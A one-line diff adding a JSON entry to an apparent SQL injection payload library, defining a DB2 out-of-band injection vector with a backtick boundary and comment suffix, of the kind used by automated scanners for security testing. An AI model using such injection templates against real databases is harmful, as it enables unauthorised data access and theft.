@@ -1,0 +1,1 @@
+{"dbms": "db2", "technique": "oob", "boundary": {"prefix": "`", "suffix": "-- -", "type": "backtick"}, "vector": "{B} AND 1=(SELECT ({Q}))/*OOB {OOB}*/", "comment": "db2 oob: backtick"}
